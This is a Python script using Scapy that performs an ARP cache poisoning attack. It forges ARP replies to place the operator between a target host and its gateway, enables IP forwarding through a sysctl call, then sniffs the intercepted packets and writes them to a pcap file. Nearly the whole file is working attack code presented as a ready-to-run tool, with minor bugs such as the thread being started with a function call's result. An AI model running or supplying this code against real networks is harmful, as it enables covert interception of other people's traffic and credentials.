import threading


from scapy.all import *
# Input parameters
from scapy.layers.l2 import ARP

gateway = input("Enter gateway IP ")
target = input("Enter target IP ")

#ex. :conf.iface = "wlp7s0"
#conf.iface is the interface that does your networking, check ifconfing/ipconfig on Windows to see what it is
conf.iface = input("Input your default interface: ")
#Get target MAC using arp requests, IP of the target needs to be specified


def get_mac(target1):
    ans = sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=target1), timeout=10)
    try:
        return ans[ARP].hwsrc
    except TypeError:
        print("The response was empty, check connection or parametres!")
    except PermissionError:
        print("You have not set the permissions yet, are you root?")


gatewayMAC = get_mac(gateway)
print(gatewayMAC)
targetMAC = get_mac(target)


#Read readme to understand this
#Use ctrl+c when you think it worked to stop the function from running.
def poison(target_ip, gateway_mac, gateway_ip, target_mac):
    try:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
        time.sleep(2)
    except KeyboardInterrupt:
        print("Ending")


print("Script running")
#Command that allows us to forward IP packets, could be different based on OS
#sysctl -w net.ipv4.ip_forward=1
os.system("sysctl -w net.ipv4.ip_forward=1")
try:
    print("Parametres:")
    print("Gateway IP & MAC" + gateway + " " + gatewayMAC)
    print("Tarca IP & MAC" + target + " " + targetMAC)
    print("Poisoning")
except TypeError:
    print("There was an empty return string!")
poison_thread = threading.Thread(target=poison(target, gatewayMAC, gateway, targetMAC))
poison_thread.start()
packet_count = 20
#Input filter ex: icmp , tcp etc.
sniff_filter = input("Input filter")
try:
    print("Sniffing")
    paketi = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap("python.pcap", paketi)
#CTRL+C or OS specific keyboard interrupt ends the sniffing and thus the program.
except KeyboardInterrupt:
    sys.exit(0)





